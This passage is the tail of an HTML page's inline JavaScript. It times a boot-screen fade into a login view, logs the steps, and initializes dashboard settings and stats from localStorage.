                logActivity('Login Page Initialization started', 'Boot');

                // Step 3: Transition to Login Page after another 3 seconds
                setTimeout(() => {
                    initializationScreen.classList.remove('active'); // Fade out init screen
                    loginWrapper.style.display = 'flex'; // Show login wrapper
                    // Optionally fade in login wrapper
                    loginWrapper.style.opacity = '0';
                    setTimeout(() => loginWrapper.style.opacity = '1', 50);
                    logActivity('Transitioned to Login Page', 'Boot');
                }, 3000);
            }, 3000);
        }, 100); // Small delay to ensure DOM is fully ready

        // Initialize Settings for dashboard (even if dashboard not visible yet)
        dashboard.initSettings();
        // Initialize stats (load from localStorage)
        stats.init();
    });

  </script>
</body>
</html>
